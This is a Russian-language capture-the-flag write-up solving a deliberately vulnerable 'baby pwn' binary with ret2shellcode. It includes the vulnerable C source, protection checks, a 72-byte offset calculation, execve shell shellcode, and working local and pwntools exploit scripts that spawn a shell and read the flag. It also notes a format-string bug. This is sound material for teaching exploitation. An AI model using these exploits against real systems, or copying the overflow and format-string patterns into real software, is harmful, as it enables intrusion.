# Baby Pwn Writeup

Категория: `pwn`

Сложность: `baby / easy`

Целевой бинарь: `vuln` (запускается под `pwn.red/jail`)

## Кратко

Классический `ret2shellcode`. Сервис сам печатает адрес стека (снимает ASLR), стек
исполняемый (`-z execstack`), бинарь без PIE и без канарейки. Второй `fgets` переполняет
64-байтный буфер и позволяет перезаписать адрес возврата адресом самого буфера, куда мы
кладём shellcode.

## 1. Первый запуск

```text
$ nc <host> <port>
Welcom to baby++ pwn
Stack address leak: 0x7ffe1c2a4b20
Enter some text: AAAA
=== ECHO SERVICE v0.1337 ===
AAAA
Payload: BBBB
Goodbye baby
```

Сразу видно главное: сервис **печатает адрес стека** (`Stack address leak`), просит ввод
дважды и эхо-ит первый ввод.

## 2. Исходный код

```c
void v_function() {
    char buf[64];
    printf("Stack address leak: %p\n", buf);   // (1) утечка адреса buf
    printf("Enter some text: ");
    fgets(buf, 80, stdin);                      // (2) 79 байт в buf[64] -> overflow
    puts("=== ECHO SERVICE v0.1337 ===");
    printf(buf);                                // (3) format string (не нужен для intended)
    printf("\nPayload: ");
    fgets(buf, 128, stdin);                     // (4) 127 байт в buf[64] -> overflow
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("Welcom to baby++ pwn");
    v_function();
    printf("Goodbye baby");
    return 0;
}
```

Уязвимость очевидна: `buf` — 64 байта, а `fgets(buf, 128, stdin)` в строке (4) читает до
127 байт. Значит можно затереть сохранённый `rbp` и адрес возврата.

## 3. Защиты (checksec)

```text
Arch:     amd64-64-little
RELRO:    No RELRO           (-Wl,-z,norelro)
Stack:    No canary found    (-fno-stack-protector)
NX:       NX disabled        (-z execstack)  -> GNU_STACK RWE
PIE:      No PIE             (-no-pie)        -> Type: EXEC
ASLR:     включён системно   -> нужен leak адреса стека
```

Проверка на стенде:
```text
readelf -lW vuln | grep STACK  ->  GNU_STACK ... RWE   (стек исполняемый)
readelf -hW vuln | grep Type   ->  Type: EXEC          (нет PIE)
```

Всё готово для `ret2shellcode`: исполняемый стек + известный (через leak) адрес буфера +
переполнение до адреса возврата.

## 4. Ключевые факты для эксплойта

- **Leak.** Строка (1) печатает `%p` адрес `buf` — это точный рантайм-адрес буфера на
  стеке, снимает ASLR.
- **Смещение до RET.** `buf[64]`, за ним сохранённый `rbp` (8 байт), за ним адрес
  возврата. Итого **72 байта** от начала `buf` до RET.

  Подтверждается дизассемблером `v_function`:
  ```asm
  push   rbp
  mov    rbp, rsp
  sub    rsp, 0x40        ; buf = rbp-0x40 (64 байта)
  ...
  leave
  ret                     ; RET = [rbp+8] = buf+72
  ```
- **Исполняемый стек.** Можно положить shellcode прямо в `buf` и вернуться на него.
- **`fgets` и `\n`.** `fgets` останавливается на `0x0a`, поэтому в payload не должно быть
  байта `0x0a` (нулевые байты — можно, `fgets` на них не останавливается).

## 5. План эксплуатации (ret2shellcode)

Второй `fgets` (строка 4) — наша точка записи. Раскладка полезной нагрузки (80 байт):

```text
[ shellcode (23) ][ NOP padding до 72 ][ p64(buf_leak) ]  \n
       ^ RIP после `ret` прыгает сюда (= адрес buf)
```

shellcode — стандартный `execve("/bin//sh", NULL, NULL)`, 23 байта, без `0x0a`:
```text
48 31 f6 56 48 bf 2f 62 69 6e 2f 2f 73 68 57 54 5f 6a 3b 58 99 0f 05
```

Порядок действий:
1. прочитать строку `Stack address leak: 0x...`, распарсить адрес `buf`;
2. на первый `fgets` отправить что угодно (например `A`);
3. на второй `fgets` отправить `shellcode + padding + p64(buf)`;
4. по выходу из `v_function` `ret` передаёт управление на `buf` → исполняется shellcode →
   шелл.

## 6. Exploit

Без внешних зависимостей (`exploit.py`, локальный запуск):

```python
#!/usr/bin/env python3
import sys, os, re, struct, subprocess, time, fcntl

# execve("/bin//sh"), 23 байта, без 0x0a
SC  = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
OFF = 72  # buf(64) + saved rbp(8) -> RET

target = sys.argv[1] if len(sys.argv) > 1 else "./vuln"
p = subprocess.Popen([target], stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
fl = fcntl.fcntl(p.stdout, fcntl.F_GETFL)
fcntl.fcntl(p.stdout, fcntl.F_SETFL, fl | os.O_NONBLOCK)

def rd(t=0.4):
    time.sleep(t)
    try: return p.stdout.read() or b""
    except Exception: return b""

buf = int(re.search(rb"leak:\s*(0x[0-9a-fA-F]+)", rd()).group(1), 16)
print("[+] buf leak =", hex(buf))
p.stdin.write(b"A\n"); p.stdin.flush(); rd()                 # 1-й fgets (безвредно)
payload = SC + b"\x90" * (OFF - len(SC)) + struct.pack("<Q", buf) + b"\n"
p.stdin.write(payload); p.stdin.flush(); time.sleep(0.3)     # 2-й fgets -> перезапись RET
p.stdin.write(b"id; cat flag.txt; echo PWNED_OK\n"); p.stdin.flush()
print(rd(0.6).decode(errors="replace"))
```

Пример вывода (проверено на стенде, ASLR=2):
```text
[+] buf leak = 0x7ffc1cd35d30
uid=1000(user) gid=1000(user) ...
FLAG{THIS_IS_PWN_MOTHERFUCKER}
PWNED_OK
```

## 7. Remote через pwntools

Для сетевого сервиса логика та же — меняется только транспорт:

```python
from pwn import remote, p64
SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")

io = remote("HOST", 1337)
io.recvuntil(b"leak: ")
buf = int(io.recvline().strip(), 16)
io.sendlineafter(b"Enter some text: ", b"A")            # 1-й fgets
payload = SC + b"\x90" * (72 - len(SC)) + p64(buf)
io.sendlineafter(b"Payload: ", payload)                 # 2-й fgets
io.sendline(b"cat flag.txt")
io.interactive()
```

## 8. Финальное объяснение

Эксплойт работает, потому что:

```text
сервис сам печатает адрес buf          -> знаем, куда прыгать (обход ASLR);
стек исполняемый (execstack)           -> shellcode в buf можно исполнить;
fgets(buf,128) переполняет buf[64]     -> перезаписываем адрес возврата;
адрес возврата = buf                   -> после ret управление уходит на shellcode;
shellcode = execve("/bin//sh")         -> получаем шелл, читаем флаг.
```

Смещение до адреса возврата — `64 (buf) + 8 (saved rbp) = 72`.

> Примечание. В строке (3) есть ещё и format-string баг (`printf(buf)`) — самостоятельный
> примитив чтения/записи. Для задуманного `ret2shellcode` он не нужен, но при желании
> задание решается и через него (перезапись GOT при отсутствии RELRO/PIE).

## Флаг

```text
FLAG{THIS_IS_PWN_MOTHERFUCKER}
```
